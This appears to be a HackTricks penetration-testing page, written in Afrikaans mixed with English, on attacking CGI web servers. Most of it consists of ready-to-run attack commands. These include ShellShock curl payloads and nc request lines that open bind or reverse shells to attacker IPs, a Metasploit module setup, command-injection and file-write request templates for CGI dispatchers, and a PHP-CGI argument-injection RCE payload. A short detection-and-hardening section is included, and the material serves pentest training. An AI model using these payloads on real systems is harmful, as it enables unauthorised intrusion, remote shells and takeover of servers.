# CGI Pentesting

{{#include ../../banners/hacktricks-training.md}}


## Inligting

Die **CGI scripts are perl scripts**, so, as jy 'n bediener gekompromitteer het wat _**.cgi**_ scripts kan uitvoer, kan jy **upload a perl reverse shell** (`/usr/share/webshells/perl/perl-reverse-shell.pl`), **change the extension** van **.pl** na **.cgi**, gee **execute permissions** (`chmod +x`) en **access** die reverse shell **from the web browser** om dit uit te voer.
Om te toets vir **CGI vulns** word aanbeveel om `nikto -C all` (en al die plugins) te gebruik.

## **ShellShock**

**ShellShock** is 'n **vulnerability** wat die wyd gebruikte **Bash** command-line shell in Unix-gebaseerde bedryfstelsels raak. Dit mik op die vermoë van **Bash** om commands wat deur applications deurgegee word, uit te voer. Die kwesbaarheid lê in die manipulasie van **environment variables**, wat dinamiese benoemde waardes is wat beïnvloed hoe prosesse op 'n rekenaar verloop. Aanvallers kan dit uitbuit deur **malicious code** aan environment variables te heg, wat uitgevoer word wanneer die veranderlike ontvang word. Dit stel aanvallers in staat om moontlik die stelsel te kompromitteer.

Wanneer hierdie kwesbaarheid uitgebuit word, kan die bladsy 'n fout teruggee.

Jy kan hierdie kwesbaarheid vind deur op te let dat dit 'n ou **Apache** weergawe en **cgi_mod** (met `cgi` gids) gebruik, of deur **nikto** te gebruik.

### **Test**

Die meeste toetse is gebaseer op om iets met `echo` te vertoon en te verwag dat daardie string in die webrespons teruggestuur word. As jy dink 'n bladsy mag kwesbaar wees, soek na al die `cgi` bladsye en toets hulle.

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(weerkaats, blind en out-of-band\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
### Exploit
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
## Gesentraliseerde CGI dispatchers (enkel eindpunt-routering via selekteerder-parameters)

Baie ingebedde web-UIs multiplexeer 'n dosyn bevoorregte aksies agter 'n enkele CGI-endpoint (byvoorbeeld, `/cgi-bin/cstecgi.cgi`) en gebruik 'n selekteerder-parameter soos `topicurl=<handler>` om die versoek na 'n interne funksie te stuur.

Metodologie om hierdie routers te eksploiteer:

- Enumereer handler names: scrape JS/HTML, brute-force met wordlists, of unpack firmware en grep vir handler strings wat deur die dispatcher gebruik word.
- Test unauthenticated reachability: sommige handlers vergeet auth checks en is direk aanroepbaar.
- Fokus op handlers wat system utilities aanroep of files touch; swak validators blokkeer dikwels net 'n paar karakters en kan die voorloopse hyphen `-` mis.

Generiese exploit-vorms:
```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# 1) Option/flag injection (no shell metacharacters): flip argv of downstream tools
topicurl=<handler>&param=-n

# 2) Parameter-to-shell injection (classic RCE) when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;

# 3) Validator bypass → arbitrary file write in file-touching handlers
topicurl=setWizardCfg&<crafted_fields>=/etc/init.d/S99rc
```
Opsporing en verharding:

- Kyk vir nie-geauthentiseerde versoeke na gesentraliseerde CGI-endpunte met `topicurl` wat op sensitiewe handlers gestel is.
- Merk parameters wat begin met `-` (argv option injection attempts).
- Verskaffers: vereis verifikasie op alle state-changing handlers, valideer met streng allowlists/types/lengths, en gee nooit user-controlled strings as command-line flags nie.

## Oud PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

Basies, as cgi aktief is en php "oud" \(&lt;5.3.12 / &lt; 5.4.2\) is, kan jy kode uitvoer.
Om hierdie kwesbaarheid uit te buit, moet jy toegang hê tot 'n PHP-lêer op die webbediener sonder om parameters te stuur \(veral sonder om die karakter "=" te stuur\).
Om hierdie kwesbaarheid te toets, kan jy byvoorbeeld `/index.php?-s` raadpleeg \(let op die `-s`\) en **source code of the application will appear in the response**.

Daarna, om **RCE** te verkry, kan jy hierdie spesiale navraag stuur: `/?-d allow_url_include=1 -d auto_prepend_file=php://input` en die **PHP code** wat uitgevoer moet word in die **body of the request**.
Voorbeeld:
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**Meer inligting oor die vuln en moontlike exploits:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup Example**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**

## **Proxy (MitM na Web server versoeke)**

CGI skep 'n omgewingvariabele vir elke header in die HTTP-versoek. Byvoorbeeld: "host:web.com" word geskep as "HTTP_HOST"="web.com"

Aangesien die HTTP_PROXY-variabele deur die webbediener gebruik kan word. Probeer om 'n **header** te stuur wat die volgende bevat: "**Proxy: <IP_attacker>:<PORT>**" en indien die server enige versoek gedurende die sessie maak, sal jy elke versoek wat deur die server gemaak word, kan vasvang.

## **Verwysings**

- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../../banners/hacktricks-training.md}}
